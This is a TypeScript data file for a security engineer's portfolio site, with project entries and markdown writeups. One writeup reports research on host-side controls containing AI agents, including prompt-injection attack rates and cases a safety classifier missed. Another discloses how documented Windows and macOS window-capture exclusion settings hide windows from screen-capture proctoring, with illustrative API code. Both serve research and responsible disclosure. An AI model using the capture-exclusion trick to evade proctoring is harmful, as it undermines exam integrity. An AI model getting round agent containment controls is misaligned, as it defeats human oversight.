      caseStudy: "/projects/nanomatch",
    },
    build: {
      stack: [
        "C++20",
        "CMake 3.20+",
        "Google Test 1.17",
        "GitHub Actions CI/CD",
        "AddressSanitizer",
        "UBSan",
      ],
      features: [
        "Price-time priority (FIFO) matching algorithm",
        "4 order types: Limit, Market, IOC, Fill-or-Kill",
        "Expected O(1) order-ID lookup; cancellation also searches a price-level tree in O(log M), and modification cancels then re-adds",
        "Standalone fixed-capacity pool allocator with a separate allocation benchmark",
      ],
    },
    secure: {
      measures: [
        "AddressSanitizer and UndefinedBehaviorSanitizer in CI",
        "137 Google Test cases declared across 18 test source files",
        "cppcheck static-analysis job configured for main-branch pushes and pull requests",
        "No external runtime dependencies",
      ],
    },
    fullDescription:
      "NanoMatch is a C++20 limit order book and matching engine for price-time priority matching. It supports Limit, Market, IOC and FOK orders, independent books per symbol, CSV input/output, and synthetic mixed-operation throughput and insertion-latency benchmarks. The README reports 9.29M operations/s on Apple M-series in Release mode; that result was not rerun in this audit.",
    problem:
      "Financial exchanges require ultra-low-latency order matching. Understanding how matching engines work at the systems level demands building one from scratch with real performance constraints.",
    solution: [
      "Implemented price-time priority (FIFO) matching with support for Limit, Market, IOC, and FOK orders",
      "Implemented expected O(1) order-ID lookup, O(log M) cancellation through the price-level tree, and cancel-and-re-add modification",
      "Built a standalone fixed-capacity pool allocator and a benchmark comparing it with new/delete",
      "Added multi-instrument support with independent order books per symbol",
    ],
    proof: [
      "Repository-reported throughput: 9.29M mixed add/cancel operations/s on Apple M-series, Release -O3 -march=native; 5M synthetic operations, fixed seed 42",
      "Insertion-latency benchmark reports p50/p99/p99.9 for add_order; these are not cancellation-latency measurements",
      "Source defines 137 Google Test cases in 18 test files; current pass status was not rerun in this audit",
      "CI config includes ASan, UBSan, cppcheck and clang-format checks for main-branch pushes and pull requests",
    ],
    updatedAt: "2026-11-04",
  },
  sentinelflow: {
    slug: "sentinelflow",
    title: "SentinelFlow",
    category: "DEFENSIVE",
    year: "2026",
    description:
      "C++17 network intrusion detection system with libpcap capture, seven protocol parsers, Snort-inspired rules and stateful scan, SYN-flood and DNS-tunnelling heuristics. It processes 500,000+ packets/sec in a synthetic single-thread benchmark.",
    tags: [
      "C++17",
      "libpcap",
      "IDS",
      "Network Security",
      "Systems Programming",
    ],
    links: {
      repo: "https://github.com/Raoof128/SentinelFlow",
      caseStudy: "/projects/sentinelflow",
    },
    build: {
      stack: [
        "C++17",
        "libpcap",
        "CMake",
        "Google Test",
        "Snort-inspired Rules",
        "BPF Filters",
      ],
      features: [
        "Live network capture via libpcap with configurable BPF filters",
        "Layered protocol dissection: Ethernet, IPv4, TCP, UDP, ICMP, DNS, ARP",
        "Snort-inspired configurable rule engine with signature matching",
        "Stateful threat detection (port scans, SYN floods, DNS tunnelling)",
      ],
    },
    secure: {
      measures: [
        "Colour-coded severity-level alerting (LOW → CRITICAL)",
        "27 Google Test cases declared across 10 parser, detector, rule and integration test files",
        "CSV export for forensic analysis and SIEM integration",
        "Configurable BPF filters for targeted capture",
      ],
    },
    fullDescription:
      "SentinelFlow is a real-time network intrusion detection system that captures live network traffic or processes pcap files, dissects protocol headers across multiple OSI layers, identifies known attack signatures and anomalies, and exports security alerts to console and CSV formats.",
    problem:
      "Understanding network intrusion detection requires tracing packet capture, protocol parsing, signature checks and stateful heuristics as separate stages with different performance costs.",
    solution: [
      "Implemented layered protocol dissection covering Ethernet, IPv4, TCP, UDP, ICMP, DNS, and ARP",
      "Built a Snort-inspired configurable rule engine for flexible signature matching",
      "Added stateful threat detection for port scans, SYN floods, and DNS tunnelling",
      "Added a single-thread parser microbenchmark over 5M repeated synthetic Ethernet/IPv4/TCP SYN-ACK packets; capture, detection and alerting are excluded",
    ],
    proof: [
      "500,000+ packets/sec in a synthetic single-thread benchmark",
      "Protocol coverage: 7 protocols across Layers 2-7",
      "Source defines 27 Google Test cases across 10 test files; the March 2026 changelog reports a historical 27/27 pass",
      "Supports both live capture and pcap file analysis",
    ],
    updatedAt: "2026-11-09",
  },
  ecrsm: {
    slug: "ecrsm",
    title: "eBPF Cloud Runtime Security Monitor",
    category: "DEFENSIVE",
    year: "2025",
    description:
      "Educational runtime-security prototype containing read-only eBPF tracepoint code, Go metadata heuristics, an SSE-fed React dashboard and Kubernetes deployment templates.",
    tags: ["eBPF", "Go", "React", "Kernel", "Runtime Security"],
    links: {
      repo: "https://github.com/Raoof128/eBPF-Cloud-Runtime-Security-Monitor",
      caseStudy: "/projects/ecrsm",
    },
    build: {
      stack: [
        "eBPF (C)",
        "Go (Agent)",
        "React (Dashboard)",
        "Kubernetes (Helm)",
      ],
      features: [
        "eBPF tracepoint programs for execve, connect, ptrace, memfd_create and executable mmap",
        "Go metadata enrichment and educational reverse-shell, injection-primitive and suspicious-exec heuristics",
        "React dashboard consuming Server-Sent Events at /events",
        "Helm DaemonSet and dashboard templates for isolated-lab deployment",
      ],
    },
    secure: {
      measures: [
        "Read-only eBPF collection of process and network metadata",
        "No packet payload capture in the probe; process names and filenames can still contain sensitive metadata",
        "Deployment template uses privileged mode, hostPID, and BPF/SYS_ADMIN/SYS_PTRACE capabilities; intended for isolated labs",
        "Local simulation scripts are provided for isolated educational environments; they were not executed in this audit",
      ],
    },
    fullDescription:
      "ECRSM is an educational runtime-security prototype with eBPF syscall tracepoint programs, a Go perf-buffer reader and metadata rules, a React dashboard consuming SSE, and Helm deployment templates. It demonstrates the components of kernel-level visibility. End-to-end event capture, detection accuracy, overhead and Kubernetes deployment were not validated in this source audit.",
    problem:
      "Kernel-level runtime monitoring is difficult to study. ECRSM provides an educational reference for syscall metadata collection, heuristic alerting and dashboard presentation in isolated labs.",
    solution: [
      "Wrote read-only eBPF tracepoint programs for five syscall event types",
      "Built a Go perf-buffer reader, container-ID lookup, environment-based pod hints and metadata heuristics",
      "Created a React dashboard backed by a Server-Sent Events alert endpoint",
      "Added local simulation scripts and Helm assets for educational lab use",
    ],
    proof: [
      "Source defines heuristics for shell connections, injection primitives and suspicious execution paths; detection accuracy is unmeasured here",
      "Perf-buffer transport code is present; runtime overhead was not benchmarked in this audit",
      "Container IDs are parsed from /proc cgroups; pod labels are agent environment hints, not verified per-process Kubernetes attribution",
      "Synthetic local scripts are provided, but no end-to-end detection run was performed in this audit",
    ],
    updatedAt: "2026-11-04",
  },
  simurghforge: {
    slug: "simurghforge",
    title: "SimurghForge",
    category: "ENGINEERING",
    year: "2026",
    description:
      "Local-first macOS file converter built with Tauri v2, Rust and React 19. Nine engine adapters cover images, documents, audio, video and structured data; CLI-backed conversions require installed tools.",
    tags: ["Tauri v2", "Rust", "React", "TypeScript", "FFmpeg", "macOS"],
    links: {
      repo: "https://github.com/Raoof128/SimurghForge",
      caseStudy: "/projects/simurghforge",
    },
    build: {
      stack: [
        "Tauri v2 (Rust 1.77+)",
        "React 19.2.4",
        "TypeScript",
        "Vite",
        "Tailwind CSS v4",
        "FFmpeg",
        "LibreOffice",
        "Pandoc",
        "Python Pandas",
        "ImageMagick",
      ],
      features: [
        "9 conversion engines: 4 native Rust + 5 CLI-bridged (FFmpeg, LibreOffice, Pandoc, Pandas, ImageMagick)",
        "Compatible conversions across images, documents, audio, video and structured data, depending on the engine and installed tools",
        "Batch conversion up to 50 files with configurable concurrency (Tokio semaphore)",
        "File-header detection with extension fallback, followed by input/output engine routing",
      ],
    },
    secure: {
      measures: [
        "Conversion runs locally without a required cloud API or upload account",
        "Known file signatures inform routing; extension fallback remains and does not prevent all format spoofing",
        "Canonicalised input paths, parent-directory component checks, size limits, output-extension validation and structured subprocess arguments",
        "macOS .app build target; CLI-backed formats depend on separately installed conversion tools",
      ],
    },
    fullDescription:
      "SimurghForge is a local-first macOS converter built with Tauri v2, a Rust backend and React 19/TypeScript. It routes compatible file pairs through four native Rust engines and five CLI adapters. Batch conversion uses bounded concurrency and per-file progress. FFmpeg, LibreOffice, Pandoc, ImageMagick and Python/Pandas features require the corresponding local tools. Format-pair coverage and packaged macOS execution were not tested in this source audit.",
    problem:
      "File conversion typically requires uploading sensitive documents to cloud services, using multiple specialised tools, or installing bloated Electron apps. Users need a single, fast, privacy-respecting tool that handles all common formats locally.",
    solution: [
      "Built two engine tiers: four native Rust engines and five CLI adapters, including Python/Pandas",
      "Implemented file-header detection with extension fallback and format-pair engine routing",
      "Designed batch orchestration with Tokio semaphore-based concurrency control",
      "Configured a macOS .app target and Low/Medium/High/Lossless preset labels; CLI dependencies remain separate",
    ],
    proof: [
      "Source covers five file categories; the advertised 49-format total is not reconciled with the current 44-key UI input registry",
      "Nine engine variants are defined, with routing based on detected input type and requested output format",
      "Backend enforces at most 50 files and 1–8 concurrent conversion jobs using a Tokio semaphore",
      "Conversion uses local engines and does not require cloud APIs; no network-egress test was performed",
    ],
    updatedAt: "2026-11-04",
  },
  aion: {
    slug: "aion",
    title: "Aion",
    category: "ENGINEERING",
    year: "2026",
    description:
      "Reference-aware Bible Q&A using direct verse/chapter lookup, keyword + pgvector semantic retrieval, and real-time Gemini 3.1 Flash Lite streaming. React Native/Expo mobile app with a Tauri v2 desktop wrapper.",
    tags: [
      "React Native",
      "Expo",
      "Supabase",
      "pgvector",
      "Gemini AI",
      "Tauri v2",
    ],
    links: {
      repo: "https://github.com/Raoof128/Aion",
      caseStudy: "/projects/aion",
    },
    papers: [
      {
        title:
          "Aion-BibleQA: Evaluating Retrieval and Citation Faithfulness in Verse-Grounded Bible RAG Systems",
        label: "Preprint",
        href: "/aion-bibleqa-citation-faithfulness-bible-rag.pdf",
        kind: "download",
        venue: "Zenodo",
        year: "2026",
        status: "Pilot benchmark preprint",
        description:
          "8-page preprint: built and scored a 40-question benchmark for retrieval quality, citation support and false-premise robustness: R@5 of 0.941, mean citation support of 0.978, zero unsupported citations and 6/6 false-premise refusals.",
        doi: "10.5281/zenodo.20522874",
      },
    ],
    build: {
      stack: [
        "React Native 0.81",
        "Expo 54",
        "TypeScript",
        "Supabase PostgreSQL",
        "pgvector",
        "OpenAI Embeddings",
        "Gemini 3.1 Flash Lite",
        "Tauri v2",
        "TanStack Query v5",
        "React Native StyleSheet",
      ],
      features: [
        "Reference-aware retrieval: direct verse/chapter lookups plus regex keyword extraction, OpenAI 1536-dimension embeddings and pgvector semantic search",
        "Real-time SSE streaming from Gemini via Supabase Edge Functions",
        "Rich inline verse cards with book/chapter/verse attribution",
        "Cross-platform: React Native (iOS/Android) + Tauri v2 (macOS/Windows/Linux)",
      ],
    },
    secure: {
      measures: [
        "Chat and embedding credentials (OpenAI, Gemini and service_role) use Edge Function secrets. Optional native voice instead expects a client-provided OpenAI credential for direct Whisper calls and is outside that server-side isolation boundary",
        "IP-based rate limiting: 5/min burst, 30/3hrs per IP, 200/day global cap",
        "Row-Level Security (RLS) on all Supabase tables",
        "500-character message length cap to prevent token-stuffing",
        "Exact-match response cache (no new LLM call for an identical repeated query)",
        "Fail-closed: rate limit errors default to deny",
      ],
    },
    fullDescription:
      "Aion is a Bible companion with reference-aware retrieval: direct verse/chapter lookup, keyword filtering and pgvector semantic search provide context, and Gemini 3.1 Flash Lite streams answers through Supabase Edge Functions. It includes attributed verse cards, a React Native/Expo mobile client and a Tauri v2 desktop wrapper. Its 40-question benchmark scores retrieval quality, citation support and false-premise robustness: R@5 of 0.941, mean citation support of 0.978, zero unsupported citations and 6/6 false-premise refusals. Optional native voice has a separate client-credential limitation.",
    problem:
      "Bible study tools are either keyword-only search engines that miss semantic meaning, or AI chatbots that hallucinate verses. Users need conversational AI that is genuinely grounded in scripture with verifiable citations.",
    solution: [
      "Built reference-aware retrieval combining direct verse/chapter lookups with keyword filtering, OpenAI 1536-dimension embeddings and pgvector semantic ranking",
      "Implemented real-time SSE streaming from Gemini via Supabase Edge Functions",
      "Designed rich inline verse cards with full book/chapter/verse attribution for verifiability",
      "Added cross-platform support: React Native for mobile + Tauri v2 for native desktop",
    ],
    proof: [
      "Built and scored a 40-question benchmark for retrieval quality, citation support and false-premise robustness: R@5 of 0.941, mean citation support of 0.978, zero unsupported citations and 6/6 false-premise refusals",
      "IP-based rate limiting (5/min burst, 30/3hrs, 200/day) with fail-closed defaults",
      "Exact-match response cache avoids repeat LLM calls for identical queries",
      "Anonymous authentication with no sign-up; Supabase RLS applies to all tables",
    ],
    updatedAt: "2026-11-09",
  },
};

/** Sourced supporting work; no public repository or dedicated project route is asserted. */
export const supportingResearch = {
  sentinelssh: {
    title: "SentinelSSH",
    description:
      "Rust MCP server giving AI agents policy-scoped, read-only inspection of Linux hosts through 17 typed tools and no shell.",
    stack: ["Rust", "MCP", "Linux"],
    typedTools: 17,
  },
} as const;

export interface Writeup {
  slug: string;
  title: string;
  date: string; // Original publication date (datePublished).
  updatedAt?: string; // Last substantive revision (dateModified); falls back to `date`.
  tag: string;
  takeaway: string;
  content: string; // Markdown content
}

export const writeups: Writeup[] = [
  {
    slug: "project-simurgh-containment",
    title: "Testing Host-Side Authorisation Across Two Models",
    date: "2026-06-28",
    updatedAt: "2026-11-04",
    tag: "AI Security",
    takeaway:
      "October 2026 matched-control study: Llama-3.2-3B restricted-state trials with new effects 17/24 → 0/24, with 23/24 useful completions; no incremental protection on an already-clean gpt-6-luna baseline.",
    content: `
## What the prototype controls

**Project Simurgh** is a sole-author, open-source research prototype for inspecting what an AI agent is permitted to do. Delegation, stop, lease and credential state live on the host. Every tool proposal is checked against that state outside the model. Its Ed25519-signed evidence archives replay offline in one command.

The current question is empirical: do composed host controls improve restricted-state behaviour while retaining useful work, compared with matched controls and the model’s own baseline?

### The October 2026 transfer protocol

The study used **24 tasks**, **two trials** per task, **three matched controls** and **two models**, producing **288 replayed branches**. Protocol to published package took three days, **15–17 October 2026**.

| Control | Purpose |
|---------|---------|
| **Credential-only** | Compare against credential checks without the composed host-state controls |
| **Composed** | Check host-held delegation, stop, lease and credential state outside the model |
| **Deny-all** | Compare with a control that denies proposals rather than preserving useful work |

### A benefit and a null result

On **Meta Llama-3.2-3B**, composed controls cut restricted-state trials with new effects from **17/24 to 0/24**, retained **23/24 useful completions** and blocked no valid proposal. These are trial-level outcomes in this study, not a general safety guarantee.

On **OpenAI gpt-6-luna**, the baseline was already **0/24**. The study therefore reports **no incremental protection** on that model. A clean baseline is part of the result, not evidence that composed controls added protection there.

### Uncertainty belongs to states

The **24 restricted trials** fall into **six states**. Wilson **95%** intervals are reported per state: **43.6–97.0% versus 0.0–39.0%**. Trials are not presented as independent state-level replications, and part of the gap holds by construction.

### A live integration failure remains visible

An eight-case **OpenAI Responses API** workflow exposed a role-placement error: **8/8 declined**. The original traces were retained. A frozen developer-role correction completed **2/3 authorised workflows** and declined **5/5 restricted workflows**, with **one refusal still open**. The corrected run does not erase the original failure or establish that every authorised workflow succeeds.

### Earlier frozen experiments

A separate frozen 2026 stage used a real **Llama Guard 4 12B** classifier over **180 cases**. Simurgh produced containment evidence for all **138/138** malicious cases it missed, including **120 downstream injections** outside an input-only classifier’s view. This is a coverage claim, not a ranking of classifiers.

Another frozen 2026 stage reduced a live **Llama-3.3-70B** agent’s targeted attack success on AgentDojo from **9/140 to 0/140** over pre-registered injections in the workspace suite. The full four-suite deterministic run scored **0/949** attack success with **949/949 unattacked utility**. Both are scoped as small experiments; they are not the October transfer study.

### What can be inspected

The work is built to be reproduced: **Ed25519-signed evidence archives replay offline in one command**; **39 Lean 4 proofs** sit behind a gate that fails on any unproven “sorry” placeholder; **5,171 tests** passed in the 19 October 2026 smoke run.

The current implementation includes Python controls and a React evidence explorer with a shared JSON CLI. **39 Lean 4 proofs** sit behind a gate that fails on any unproven “sorry” placeholder. **5,171 tests** passed in the **19 October 2026 smoke run**; the project has **92 releases**.

The author audited **919 of the project’s own documents** and published **all 141 dated findings**, including overstatements in earlier closeouts, in the README. This is part of the evidence trail, not a claim that the prototype has no remaining defects.

### Sources and limits

The current software archive has DOI **10.5281/zenodo.21737792**. The earlier device-integrity preprint has a different DOI, **10.5281/zenodo.20374849**; it records the project’s original high-stakes-session research and is not the current software study. The root package declares **AGPL-3.0-or-later**.

The October results describe this protocol, these controls and two tested models. They include a null result, state-cluster uncertainty, a gap that partly holds by construction and an unresolved authorised-workflow refusal. The host, provisioning, storage and receiver remain trusted; the two models use different tool interfaces, the tasks are internally authored, and independent outside reproduction remains open. The study does not establish universal containment, model ranking or prevention of every unsafe model output.
`,
  },
  {
    slug: "invisible-window-research",
    title: "Testing What Screen Capture Can Miss",
    date: "2026-03-20",
    updatedAt: "2026-11-04",
    tag: "Security Research",
    takeaway:
      "Documented window-capture settings achieved 100% evasion without capture artefacts in controlled laboratory simulations on tested Windows and macOS versions. Commercial proctoring products and Linux were not tested.",
    content: `
## The Vulnerability in One Sentence

Windows and macOS expose documented window-sharing or capture-affinity settings that can keep an application's window visible on the physical display while excluding it from capture paths that honour those settings. The study demonstrates the resulting gap in screen-capture-based proctoring using controlled laboratory simulations.

---

## Background: How Proctoring Works

WebRTC-based remote proctoring systems, the kind deployed by universities worldwide since 2020, work by capturing the student's screen during an exam session. The browser extension or native client requests a \`getDisplayMedia()\` stream, transmits it to the proctor's server, and flags anomalies: opened windows, visible applications, clipboard activity. The implicit security model is:

> **If I capture your screen, I can see everything on it.**

This assumption is wrong on Windows and macOS.

---

## The Windows Side: \`SetWindowDisplayAffinity\`

Windows documents display affinity as a best-effort control over compatible capture paths. Microsoft explicitly says it is not a security feature or a Digital Rights Management guarantee. The paper examines the downstream risk when capture consumers assume those frames show everything on the physical display. The API signature is:

\`\`\`c
BOOL SetWindowDisplayAffinity(HWND hWnd, DWORD dwAffinity);
\`\`\`

The study reports exclusion in its tested Windows 10/11 browser configurations. The retained Windows 10 forensic harness separately tested \`BitBlt\` and .NET \`CopyFromScreen\`. Those observations do not establish identical behaviour for every Windows capture API or later browser version.

In those tested configurations, the window remained visible on the physical display while its content was absent from capture.

**No administrator privileges are required.** The API operates on windows owned by the calling process, which is entirely within normal user-space operation. No kernel modifications, no driver signing bypass, no privilege escalation.

### Illustrative API call (Win32 C)

\`\`\`c
#include <windows.h>

int main() {
    HWND hwnd = CreateWindowEx(/* ... window params ... */);

    // Request exclusion from compatible screen-capture paths
    SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE);

    ShowWindow(hwnd, SW_SHOW);
    // Window is visible on physical display
    // Tested compatible capture paths exclude the window

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
\`\`\`

---

## The macOS Side: \`NSWindow.SharingType.none\`

Apple's equivalent is found in AppKit. Every \`NSWindow\` instance has a \`sharingType\` property, documented in the AppKit reference since macOS 10.6 (2009):

\`\`\`swift
import AppKit

let window = NSWindow(
    contentRect: NSRect(x: 100, y: 100, width: 800, height: 600),
    styleMask: [.titled, .closable, .resizable],
    backing: .buffered,
    defer: false
)

// Request exclusion from paths that honour the sharing flag
window.sharingType = .none

window.makeKeyAndOrderFront(nil)
\`\`\`

Setting \`sharingType\` to \`.none\` requests exclusion from paths that respect the window-sharing flag. On macOS 26.3.1, the retained tests used \`CGWindowListCreateImage\` and the \`screencapture\` utility. They did not directly test ScreenCaptureKit or browser \`getDisplayMedia()\` on macOS 26. The paper separately reports browser results on macOS 14.3.

**Tested macOS 26.3.1 native captures remained affected.** Despite Apple's documented ScreenCaptureKit changes in macOS 15, the study observed capture exclusion with \`.none\` using native capture tools. It did not test browser-based capture on macOS 26 or establish the behaviour of every ScreenCaptureKit client.

---

## Test Results

| Platform | Laboratory capture outcome | Observed capture artefacts |
|----------|-----------------------------|---------------------------|
| Windows 10 | Window excluded | None |
| Windows 11 | Window excluded | None |
| macOS 14 | Window excluded | None |
| macOS 26.3.1 | Excluded in native captures; browser capture not tested | None |
| Linux (X11) | Not tested | Not tested |
| Linux (Wayland) | Not tested | Not tested |

These results concern simulated proctoring in a controlled laboratory, not commercial products. The macOS 26 evaluation used \`CGWindowListCreateImage\` and the \`screencapture\` utility, not a browser \`getDisplayMedia()\` call. Linux X11 and Wayland were not tested. The behavioural study involved n = 8 consenting research-team members; p = 0.41 does not prove that behavioural detection is impossible. The findings reflect tested software versions as of March 2026; later versions may behave differently.

---

## Why This Is Structurally Hard to Fix

The vulnerability is a design conflict between two legitimate OS features:

1. **Capture-exclusion settings**: Operating systems expose window-sharing and display-affinity settings that compatible capture paths may honour. These settings do not constitute a universal content-protection guarantee.

2. **Exam Integrity**: Proctoring systems assume that capturing the screen gives a complete view of the user's desktop.

When a tested capture path honours exclusion while the window stays visible, that stream alone is insufficient evidence of the complete physical display. The study establishes this mismatch in its stated configurations; it does not establish that every capture implementation shares it.

**Mitigation options have trade-offs and do not establish a universal integrity guarantee:**

- Native capture-exclusion flag enumeration and window-focus monitoring can provide additional signals, subject to the limitations discussed in the paper
- Move to hardware-attested environment proofs (TPM, Secure Enclave) rather than screen content analysis
- Advocate for OS-level capture-integrity APIs and assess residual risks rather than assuming capture alone proves integrity

---

## Responsible Disclosure Timeline

| Date | Action |
|------|--------|
| January 2026 | Discovery and verification in a controlled laboratory on Windows 10 and macOS 14 |
| February 2026 | Extended native-capture testing to macOS 26.3.1; Microsoft notified |
| March 2026 | Apple notified and responded |
| April 2026 | Microsoft responded with its security-boundary classification |
| May 2026 | Public disclosure following OS vendor responses; preprint published (CC BY 4.0) |

Both vendors classified the behavior as by design: Apple as not an Apple security issue, Microsoft as not a security vulnerability. The research frames the concern as a downstream display-fidelity failure, not an OS zero-day.

---

## Takeaway

The tested Windows and macOS capture paths can omit an application window while it remains visible to the user, without elevated privileges or observed capture artefacts. This exposes a mismatch between content-protection features and the assumption that captured pixels fully represent the physical display. The study establishes that gap within its tested laboratory scope; it does not establish that every commercial proctoring product or every capture API can be bypassed.

The full 13-page IEEE-format preprint is linked from the project page (DOI **10.5281/zenodo.20376495**, CC BY 4.0). Proof-of-concept code is withheld on dual-use grounds. The illustrative API examples above remain illustrations rather than fresh test evidence.
    `,
  },
  {
    slug: "nanomatch-deep-dive",
    title:
      "Inside NanoMatch: Matching Data Structures and Synthetic Benchmarks",
    date: "2026-03-10",
    updatedAt: "2026-11-04",
    tag: "C++",
    takeaway:
      "Expected O(1) order-ID lookup, O(log M) cancellation, insertion-latency measurements and a standalone pool allocator in a C++20 matching-engine prototype.",
    content: `
## Matching orders with explicit data structures

**NanoMatch** is a C++20 price-time matching engine with Limit, Market, Immediate-or-Cancel (IOC) and Fill-or-Kill (FOK) orders. A \`MatchingEngine\` routes requests to independent books per symbol. CSV input/output and deterministic synthetic benchmarks make the implementation inspectable.

### Three cooperating structures

| Layer | Structure | Role |
|-------|-----------|------|
| Price levels | \`std::map<Price, PriceLevel>\` | Orders prices; new levels require O(log M) tree insertion and the best level is available through \`begin()\` |
| Per-level queue | \`std::list<Order>\` | Maintains FIFO time priority and permits constant-time erase by a stored iterator |
| Order-ID index | \`std::unordered_map<OrderID, OrderLocation>\` | Provides expected O(1) ID lookup and stores the price, side and queue iterator |

**ID lookup and cancellation have different costs.** After the hash lookup, \`cancel_order()\` calls \`BookSide::remove_order()\`, which searches the price-level tree with \`std::map::find\`. Cancellation therefore includes O(log M) work. Modification cancels and re-adds the order, preserving its type and losing its previous time priority.

### Matching and order types

The matching loop takes orders from the best opposing price level in FIFO order. Limit remainders can rest on the book; unfilled Market and IOC quantities do not. FOK performs an available-quantity check before matching. These are implemented prototype behaviours, not certification of exchange-grade operation.

### What the pool allocator demonstrates

The repository includes a fixed-capacity free-list \`PoolAllocator<T>\` and a separate benchmark comparing allocation with \`new\`/\`delete\`. It pre-allocates storage and reuses slots.

The matching book still stores orders in a default \`std::list\`, with ordinary map, hash-map and trade-vector storage. The pool's presence does **not** establish an allocation-free matching hot path or prove that it removes tail-latency spikes from order processing.

### Read the benchmark as a workload

The pinned README reports these results for an Apple M-series Release build using \`-O3 -march=native\`:

| Repository-reported metric | Value | Scope |
|----------------------------|-------|-------|
| Throughput | 9,290,192 operations/s | 5M pre-generated synthetic operations, roughly 80% adds and 20% cancel attempts, fixed seed 42, single thread |
| p50 | 84 ns | Separate \`add_order\` latency benchmark |
| p99 | 625 ns | Separate \`add_order\` latency benchmark |
| p99.9 | 1,250 ns | Separate \`add_order\` latency benchmark |

The latency timer surrounds **\`add_order()\`**, not cancellation. Throughput counts mixed operations, including cancel attempts, rather than an equal number of completed new orders. These published figures were not rerun in the November 2026 source audit. Exact CPU model, compiler version and raw run artifacts are not supplied in the inspected benchmark documentation, so they are not portable performance guarantees. The source does not establish causes for the tail samples.

### Tests and evidence boundaries

The pinned source defines **137 Google Test cases across 18 test source files**, with 20 distinct Google Test suite names. CI is configured for main-branch pushes and pull requests, including compiler/build matrices, ASan, UBSan, cppcheck and formatting checks. This audit counted source declarations and inspected configuration; it did not execute the suite or establish a fresh CI pass.

### Pinned sources

- [README and reported measurements](https://github.com/Raoof128/NanoMatch/blob/b92593f4593c504029626619bd936a36fc157208/README.md)
- [Cancellation and modification](https://github.com/Raoof128/NanoMatch/blob/b92593f4593c504029626619bd936a36fc157208/src/book/order_book.cpp)
- [Price-level tree lookup](https://github.com/Raoof128/NanoMatch/blob/b92593f4593c504029626619bd936a36fc157208/include/nanomatch/book/book_side.hpp)
- [Insertion-latency benchmark](https://github.com/Raoof128/NanoMatch/blob/b92593f4593c504029626619bd936a36fc157208/bench/bench_latency.cpp)
- [Standalone pool benchmark](https://github.com/Raoof128/NanoMatch/blob/b92593f4593c504029626619bd936a36fc157208/bench/bench_memory.cpp)
`,
  },
  {
    slug: "sentinelflow-deep-dive",
    title: "Anatomy of a Network Intrusion Detection System",
    date: "2026-03-15",
    updatedAt: "2026-11-04",
    tag: "Network Security",
    takeaway:
      "A C++17 Capture → Parse → Detect → Alert pipeline that processes 500,000+ packets/sec in a synthetic single-thread benchmark.",
    content: `
## Four stages with different costs

**SentinelFlow** implements a C++17 network intrusion detection pipeline: **Capture → Parse → Detect → Alert**. It supports libpcap live capture and offline pcap input, seven protocol parsers, basic Snort-inspired signatures, stateful heuristics, and console/CSV alerts.

The repository's throughput measurement covers only part of that pipeline. Its parser benchmark is useful for studying parsing cost; it does not measure live IDS capacity.

### Capture and protocol dissection

\`LiveCapture\` wraps \`pcap_open_live\`, compiles optional BPF expressions and installs them through libpcap. \`PcapFileReader\` uses \`pcap_open_offline\`. The actual capture/filter execution path depends on the platform and libpcap; this source audit did not measure kernel filtering or packet-copy savings.

The parser set covers **Ethernet, IPv4, TCP, UDP, ICMP, DNS and ARP**. Protocol headers have different lengths and dispatch rules, so the pipeline tracks the layers present in a parsed packet. Header parsing, DNS decoding, detection state and alert output should be assessed separately rather than described as one universally allocation-free operation.

### Snort-inspired does not mean Snort-compatible

The rule parser accepts a small rule syntax with protocol/address/port fields and options. Basic signature matching checks the parsed fields, TCP flags and content patterns.

\`\`\`text
alert tcp any any -> any 22 (msg:"SSH connection attempt"; sid:1001;)
\`\`\`

There is an implementation limit: \`SignatureMatcher\` skips rules with threshold or DNS-query-length options. The three stateful detectors are constructed separately with fixed thresholds. Parsing an option is therefore not proof that it configures the associated stateful detector, and the implementation is not a drop-in Snort rule engine.

### Stateful heuristics

- **Port scans:** per-source/destination records collect distinct destination ports and timestamps; the configured trigger is 15 ports within a 60-second record window.
- **SYN floods:** per-destination timestamp queues count SYN packets without ACK, triggering at 100 events over 10 seconds.
- **DNS tunnelling indicators:** per-source queues count query names longer than 50 characters, triggering at 20 such queries over 60 seconds.

The code performs lazy cleanup when records are accessed. These are heuristic indicators. Their presence does not establish false-positive rates, resistance to evasion or production detection accuracy.

### Throughput

SentinelFlow processes **500,000+ packets/sec** in a synthetic single-thread benchmark.

### Alerts and verification

The alert layer can dispatch structured events to colour-coded console output and CSV logging. CSV export can support later analysis; the repository does not establish a deployed SIEM integration.

The source defines **27 Google Test cases across 10 test files** for selected parsers, detector cases, rule parsing, signature matching and integration. The March 2026 changelog reports a historical 27/27 pass. This source audit did not rerun tests and does not claim complete coverage of every protocol, detector or malformed-input path.

### Pinned sources

- [README and reported benchmark](https://github.com/Raoof128/SentinelFlow/blob/91e195204505e30008d17a1d0dd6d637a7e3ecf3/README.md)
- [Exact parser benchmark workload](https://github.com/Raoof128/SentinelFlow/blob/91e195204505e30008d17a1d0dd6d637a7e3ecf3/bench/benchmark_throughput.cpp)
- [Signature matcher limits](https://github.com/Raoof128/SentinelFlow/blob/91e195204505e30008d17a1d0dd6d637a7e3ecf3/src/detection/signature_matcher.cpp)
- [Stateful detector configuration](https://github.com/Raoof128/SentinelFlow/blob/91e195204505e30008d17a1d0dd6d637a7e3ecf3/src/detection/detection_engine.cpp)
`,
  },
  {
    slug: "ecrsm-deep-dive",
    title: "Deep Dive: eBPF Runtime Monitoring",
    date: "2025-01-15",
    updatedAt: "2026-11-04",
    tag: "eBPF",
    takeaway:
      "An educational eBPF/Go/React monitoring scaffold: perf-buffer event transport, SSE presentation and heuristic rules, with privileged lab templates and an uncompleted attachment path.",
    content: `
## A runtime-security teaching scaffold

**ECRSM** contains read-only eBPF tracepoint program source, a Go perf-buffer reader and rules engine, an SSE-fed React dashboard, local simulation scripts and Helm deployment assets. It is an educational reference, not validated production EDR.

The distinction between code and a working telemetry pipeline matters here. In the pinned source, the Go startup loads a collection specification and obtains the perf-event map, but it contains no tracepoint link/attach calls. End-to-end syscall capture and live detection are therefore not established by the supplied startup path or this source audit.

### Five tracepoint programs

| Program | Metadata signal |
|---------|-----------------|
| \`execve\` | Executable filename and process identity |
| \`connect\` | IPv4 destination address/port and process identity |
| \`ptrace\` | A ptrace syscall attempt |
| \`memfd_create\` | Anonymous-memory file creation metadata |
| \`mmap\` with \`PROT_EXEC\` | An executable-memory mapping request |

